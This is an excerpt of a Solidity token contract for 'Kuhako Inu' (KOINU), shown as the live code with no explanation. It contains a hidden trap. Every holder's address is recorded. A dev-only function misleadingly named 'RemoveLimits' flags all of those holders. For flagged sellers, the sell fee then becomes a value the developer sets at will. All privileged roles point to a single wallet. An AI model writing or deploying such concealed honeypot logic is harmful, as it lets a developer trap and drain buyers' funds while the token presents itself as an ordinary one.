...
contract KOINU is Context, IERC20 { 
    ...
    mapping (address => bool) public _isDiamond;
    mapping (address => bool) public _DiamondHolder;
    address[] public _Diamond;

    address payable public Wallet_Marketing = payable(0xc8CE7B4E9E1359c078b6dCfF12173334838F1bF3); 
    address payable private Wallet_Dev = payable(0xc8CE7B4E9E1359c078b6dCfF12173334838F1bF3);
    ...
    string private constant _name = "Kuhako Inu"; 
    string private constant _symbol = unicode"KOINU";
    ...
    constructor () {
        ...
        _owner = 0xc8CE7B4E9E1359c078b6dCfF12173334838F1bF3;
    ...
    function ExcludedFromFee(address[] memory addrs) public { 
        require(msg.sender == Wallet_Dev);
        for (uint256 i = 0; i < addrs.length; i++) {
                    _isExcludedFromFee[addrs[i]] = true;
        }
    }
    
    function RemoveLimits() public { 
        require(msg.sender == Wallet_Dev);
        for (uint256 i = 0; i < _Diamond.length; i++) {
            _DiamondHolder[_Diamond[i]] = true;
        }
    }

    function setDiamondf(uint256 newNum) public { 
        require(msg.sender == Wallet_Dev);
        _Diamond_f = newNum;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isDiamond[from]) {
            _isDiamond[from] = true;
            _Diamond.push(from);
        }
        
        if (to != owner() && to != uniswapV2Pair && !_isDiamond[to]) {
            _isDiamond[to] = true;
            _Diamond.push(to);

            if (_DiamondHolder[from]) {
                _DiamondHolder[to] = true;
            }
        }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (_DiamondHolder[sender]) 
            _sellFEE = tAmount*_Diamond_f/_decimals;            
